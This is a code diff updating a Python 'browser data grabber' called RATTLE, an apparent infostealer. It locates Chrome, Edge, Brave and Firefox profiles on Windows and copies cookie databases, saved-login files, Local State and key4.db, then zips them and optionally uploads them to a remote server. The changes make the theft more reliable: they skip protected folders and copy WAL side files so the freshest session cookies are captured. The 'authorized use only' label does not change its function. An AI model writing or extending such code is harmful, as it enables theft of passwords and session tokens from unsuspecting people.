@@ -3,10 +3,13 @@
 # RATTLE - Browser Data Grabber (client side)
 # Runs on the Windows machine (authorized use only).
 # Finds Chrome / Edge / Brave / Firefox data,
-# copies Local State + Cookies + Login Data,
+# copies Local State + Cookies (+ WAL side files) + Login Data,
 # auto-zips everything, optionally uploads to Rattle.
 # Pure standard library - NO pip installs needed.
 # Coded by t.me/officialmonsterz
+# v2: fixed protected-folder crash, SQLite URI with spaces,
+#     added WAL/SHM copying so newest cookies are included,
+#     guarded row counting on missing files.
 # ============================================
 
 import argparse
@@ -80,15 +83,22 @@ CHROMIUM_BROWSERS = {
 FIREFOX_PROFILES = os.path.expandvars(r"%APPDATA%\Mozilla\Firefox\Profiles")
 
 
+def list_child_dirs(root):
+    """FIX 1: List directories safely. If Windows denies reading one,
+    skip it instead of crashing the whole run."""
+    try:
+        return sorted(p for p in Path(root).iterdir() if p.is_dir())
+    except OSError:
+        return []
+
+
 def find_chromium_profiles(user_data_dir):
     """Return Profile directories that actually contain a Cookies file."""
     ud = Path(user_data_dir)
     if not ud.is_dir():
         return []
     profiles = []
-    for child in sorted(ud.iterdir()):
-        if not child.is_dir():
-            continue
+    for child in list_child_dirs(ud):
         if child.name == "Default" or child.name.startswith("Profile "):
             modern = child / "Network" / "Cookies"
             legacy = child / "Cookies"
@@ -103,8 +113,8 @@ def find_firefox_profiles(profiles_root):
     if not root.is_dir():
         return []
     out = []
-    for child in sorted(root.iterdir()):
-        if child.is_dir() and (child / "cookies.sqlite").is_file():
+    for child in list_child_dirs(root):
+        if (child / "cookies.sqlite").is_file():
             out.append(child)
     return out
 
@@ -114,7 +124,9 @@ def find_firefox_profiles(profiles_root):
 # ============================================
 
 def _sqlite_uri(path):
-    return "file:" + str(path).replace("\\", "/") + "?immutable=1"
+    """FIX 2: Build a proper file:// URI so spaces in the Windows
+    username (e.g. 'John Doe') do not break the connection."""
+    return Path(path).resolve().as_uri() + "?immutable=1"
 
 
 def copy_locked_file(src, dst):
@@ -149,8 +161,36 @@ def copy_locked_file(src, dst):
         return False, str(exc)
 
 
+def copy_with_sidecars(src, dst):
+    """
+    FIX 3: Copy a database AND its -wal / -shm side files.
+    Chrome keeps the newest cookies inside the WAL file, so without
+    these the freshest cookies would be missing from the grab.
+    The side files keep names matching the destination database name,
+    so any SQLite reader can recover them later.
+    Returns (True, how) or (False, reason) from the main copy.
+    """
+    success, how = copy_locked_file(src, dst)
+    if not success:
+        return success, how
+    for suffix in ("-wal", "-shm"):
+        side_src = Path(str(src) + suffix)
+        if side_src.is_file():
+            try:
+                shutil.copy2(side_src, Path(str(dst) + suffix))
+            except OSError:
+                # Side files are optional extras - never fail the whole
+                # grab if only they could not be copied.
+                warn(f"could not copy side file: {side_src.name}")
+    return success, how
+
+
 def count_sqlite_rows(db_path, tables=("cookies", "moz_cookies")):
-    """Best-effort row count. Returns -1 if it cannot be read."""
+    """FIX 4: Best-effort row count. Returns -1 if the file is
+    missing or cannot be read (previously it could touch files that
+    failed to copy)."""
+    if not Path(db_path).is_file():
+        return -1
     try:
         con = sqlite3.connect(_sqlite_uri(db_path), uri=True)
     except sqlite3.Error:
@@ -175,7 +215,7 @@ def count_sqlite_rows(db_path, tables=("cookies", "moz_cookies")):
 
 def grab_chromium(name, user_data_dir, staging):
     """
-    Copy 'Local State' (once), then per profile: Cookies + Login Data.
+    Copy 'Local State' (once), then per profile: Cookies (+WAL) + Login Data.
     Returns dict describing the result or None if browser not installed.
     """
     ud = Path(user_data_dir)
@@ -221,12 +261,12 @@ def grab_chromium(name, user_data_dir, staging):
         if not cookies.is_file():
             cookies = prof / "Cookies"
 
-        success, how = copy_locked_file(cookies, prof_dir / "Cookies.sqlite")
+        success, how = copy_with_sidecars(cookies, prof_dir / "Cookies.sqlite")
         if success:
             result["files_copied"] += 1
             n = count_sqlite_rows(prof_dir / "Cookies.sqlite")
             if n >= 0:
-                result["cookie_count"] += n
+                result["cookie_count"] = n
             ok(f"[{name}/{prof_name}] Cookies copied ({how}, {n} cookies)")
         else:
             result["files_failed"] += 1
@@ -234,7 +274,9 @@ def grab_chromium(name, user_data_dir, staging):
 
         login_data = prof / "Login Data"
         if login_data.is_file():
-            success, how = copy_locked_file(login_data, prof_dir / "Login Data.sqlite")
+            success, how = copy_with_sidecars(
+                login_data, prof_dir / "Login Data.sqlite"
+            )
             if success:
                 result["files_copied"] += 1
                 ok(f"[{name}/{prof_name}] Login Data copied ({how})")
@@ -250,7 +292,7 @@ def grab_chromium(name, user_data_dir, staging):
 
 
 def grab_firefox(staging):
-    """Copy cookies.sqlite + logins.json + key4.db from every Firefox profile."""
+    """Copy cookies.sqlite (+WAL) + logins.json + key4.db from every Firefox profile."""
     root = Path(FIREFOX_PROFILES)
     if not root.is_dir():
         return None
@@ -275,20 +317,21 @@ def grab_firefox(staging):
         prof_dir = browser_dir / prof.name
         prof_dir.mkdir(parents=True, exist_ok=True)
 
-        wanted = ["cookies.sqlite", "logins.json", "key4.db"]
+        wanted = ["cookies.sqlite", "cookies.sqlite-wal", "cookies.sqlite-shm",
+                  "logins.json", "key4.db"]
         copied_any = False
         for fname in wanted:
             src = prof / fname
             if not src.is_file():
                 continue
-            success, how = copy_locked_file(src, prof_dir / fname)
-            if success:
+            try:
+                shutil.copy2(src, prof_dir / fname)
                 copied_any = True
                 result["files_copied"] += 1
-                ok(f"[firefox/{prof.name}] {fname} copied ({how})")
-            else:
+                ok(f"[firefox/{prof.name}] {fname} copied")
+            except OSError as exc:
                 result["files_failed"] += 1
-                warn(f"[firefox/{prof.name}] {fname} FAILED: {how}")
+                warn(f"[firefox/{prof.name}] {fname} FAILED: {exc}")
 
         n = count_sqlite_rows(prof_dir / "cookies.sqlite")
         if n >= 0:
@@ -461,9 +504,9 @@ def main():
         if args.upload:
             info(f"uploading to {args.upload} ...")
             status, text = upload_zip(zip_path, args.upload, args.key, device_label, browser_results)
-            # BUG FIX: we strip ALL spaces from the response first, so the
+            # We strip ALL spaces from the response first, so the
             # needle must ALSO be space-free ('"success":true'), otherwise
-            # a successful upload was always reported as failed.
+            # a successful upload would always be reported as failed.
             if status == 200 and '"success":true' in text.replace(" ", "").lower():
                 ok(f"upload OK - server said: {text.strip()}")
             else:
